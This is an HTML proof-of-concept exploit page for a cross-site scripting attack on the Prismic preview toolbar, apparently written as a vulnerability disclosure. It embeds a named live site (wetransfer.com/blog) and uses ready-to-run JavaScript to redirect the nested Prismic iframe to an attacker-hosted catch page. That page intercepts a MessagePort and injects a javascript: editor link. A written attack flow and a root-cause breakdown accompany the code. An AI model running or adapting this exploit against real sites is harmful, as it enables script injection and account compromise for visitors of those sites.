<!DOCTYPE html>
<html>
<head>
<title>Prismic Toolbar XSS via Iframe Hijack</title>
<style>
  body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
  h1 { color: #e94560; }
  #log { background: #16213e; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; margin: 10px 0; }
  .log-entry { margin: 4px 0; font-size: 13px; }
  .success { color: #0f0; }
  .error { color: #f00; }
  .info { color: #0af; }
  .warn { color: #fa0; }
  button { background: #e94560; color: #fff; border: none; padding: 12px 24px; border-radius: 6px;
           font-size: 16px; cursor: pointer; margin: 10px 5px; font-family: monospace; }
  button:hover { background: #c73e54; }
  pre { background: #0d1117; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 12px; color: #c9d1d9; }
  input { background: #0d1117; color: #eee; border: 1px solid #333; padding: 8px 12px; border-radius: 4px;
          font-family: monospace; font-size: 14px; width: 500px; }
  label { display: block; margin: 8px 0 4px; color: #888; font-size: 12px; }
</style>
</head>
<body>

<h1>Prismic Toolbar XSS via Iframe Hijack</h1>

<p>
  <strong>Vulnerability:</strong> Prismic toolbar iframe communication uses
  <code>postMessage('setup_port', '*', [port])</code> — wildcard target origin.<br>
  <strong>Impact:</strong> Attacker navigates the Prismic iframe to a controlled page, intercepts the
  MessagePort, and injects malicious <code>editorUrl</code> into prediction documents.
  toolbar.js renders <code>&lt;a href={editorUrl}&gt;</code> with no protocol validation → XSS on click.
</p>

<label for="target">Target URL (wetransfer.com/blog has Prismic toolbar, no framing restrictions):</label>
<input id="target" type="text" value="https://wetransfer.com/blog">

<label for="catch">Catch page URL (host poc-prismic-catch.html):</label>
<input id="catch" type="text" value="https://daemoon.me/demo/poc-prismic-catch.html">

<label for="delay">Delay before navigating Prismic iframe (ms):</label>
<input id="delay" type="number" value="3000" style="width: 100px;">

<br>
<button onclick="startAttack()">Launch</button>
<div id="log"></div>

<iframe name="victim" id="victim-frame" src="https://wetransfer.com/blog" width="100%" height="500" style="border: 2px solid #333; border-radius: 4px; margin-top: 10px;"></iframe>

<h3>Attack Flow</h3>
<pre>
1. Target page (wetransfer.com/blog) is embedded in a named &lt;iframe name="victim"&gt;
   — No X-Frame-Options or frame-ancestors headers → framing allowed
   — Attacker is ANCESTOR → can navigate any descendant frame
2. window.open(target, "victim") targets the existing iframe, returns its WindowProxy
3. After delay, navigate the nested Prismic iframe:
   x.frames[0].location.href = catchURL
   — prismic.js uses {once: true} load handler → fires for catch page instead
   — prismic.io needs DNS+TLS+HTTP (~200-500ms), attacker catches the race
4. Catch page loads → receives setup_port from prismic.js (wildcard '*' origin)
5. Catch page responds 'ready', then returns auth:true for preview_state
6. Target page loads toolbar.js → Prismic Toolbar with prediction handler
7. After 2s, prediction_docs request → catch returns [{editorUrl: "javascript:..."}]
8. toolbar.js renders: &lt;a href="javascript:..." class="document-summary"&gt; in Shadow DOM
9. Prismic toolbar icon appears at bottom-left of target page
10. User clicks icon → panel opens → clicks document link → XSS fires
</pre>

<h3>Root Causes</h3>
<pre>
A. Wildcard postMessage target origin
   prismic.js: e.contentWindow.postMessage('setup_port', '*', [port2])
   Any page loaded in the iframe receives the MessagePort.

B. No URL protocol validation on editorUrl
   toolbar.js:7461: e("a", { href: t.editorUrl, target: "_blank" })
   Attacker controls editorUrl → javascript: protocol → XSS on click

C. No framing restrictions on wetransfer.com
   No X-Frame-Options or CSP frame-ancestors headers served
   → can be embedded in attacker iframe → ancestor navigates descendant frames

D. {once: true} load handler is exploitable
   prismic.js waits for iframe load event to send setup_port.
   If attacker navigates iframe before original content loads,
   the load event fires for attacker's content instead.
</pre>

<script>
function log(msg, cls) {
  var div = document.getElementById('log');
  var ts = new Date().toISOString().substr(11, 12);
  div.innerHTML += '<div class="log-entry ' + (cls || 'info') + '">[' + ts + '] ' + msg + '</div>';
  div.scrollTop = div.scrollHeight;
}

function startAttack() {
  var TARGET = document.getElementById('target').value;
  var CATCH_URL = document.getElementById('catch').value;
  var DELAY = Number(document.getElementById('delay').value);
  if (isNaN(DELAY) || DELAY < 0) DELAY = 3000;

  log('=== Prismic Toolbar XSS via Iframe Hijack ===', 'warn');
  log('Target: ' + TARGET, 'info');
  log('Catch page: ' + CATCH_URL, 'info');
  log('Delay: ' + DELAY + 'ms', 'info');

  // Step 1: window.open targets the existing named iframe, returns its WindowProxy
  // The iframe is already loaded with the target page (pre-embedded in HTML)
  var x = window.open(TARGET, "victim");
  if (!x) {
    log('Failed to get window reference.', 'error');
    return;
  }
  log('Got reference to victim iframe window.', 'success');

  // Step 2: After delay, navigate the nested Prismic iframe to catch page
  // x.frames[0] = the first child iframe inside wetransfer.com/blog (Prismic iframe)
  // As ancestor, we can navigate descendant frames cross-origin
  log('Waiting ' + DELAY + 'ms for Prismic iframe to appear...', 'info');

  setTimeout(function() {
    try {
      log('Attempting to navigate x.frames[0] to catch page...', 'info');
      x.frames[0].location.href = CATCH_URL;
      log('Navigated Prismic iframe to catch page!', 'success');
      log('', 'info');
      log('Wait ~5 seconds for the full chain:', 'warn');
      log('  1. Catch page loads → receives setup_port from prismic.js', 'info');
      log('  2. Responds auth:true → toolbar.js loads', 'info');
      log('  3. prediction_docs → javascript: editorUrl injected', 'info');
      log('  4. Prismic toolbar icon appears at bottom-left of page in iframe', 'info');
      log('  5. Click icon → panel opens → click document link → XSS fires', 'info');
    } catch(e) {
      log('Failed: ' + e.message, 'error');
      log('', 'info');
      log('Trying alternative: polling for frames...', 'warn');

      // Fallback: poll for child frames to appear
      var attempts = 0;
      var poller = setInterval(function() {
        attempts++;
        try {
          var len = x.frames.length;
          if (len > 0) {
            clearInterval(poller);
            log('Found ' + len + ' frame(s) after ' + (attempts * 100) + 'ms', 'success');
            try {
              x.frames[0].location.href = CATCH_URL;
              log('Navigated frames[0] to catch page!', 'success');
            } catch(e2) {
              log('Navigation failed: ' + e2.message, 'error');
            }
          }
        } catch(e3) {
          // cross-origin access may throw, keep trying
        }
        if (attempts > 100) {
          clearInterval(poller);
          log('Gave up after 10s polling.', 'error');
        }
      }, 100);
    }
  }, DELAY);
}
</script>
</body>
</html>
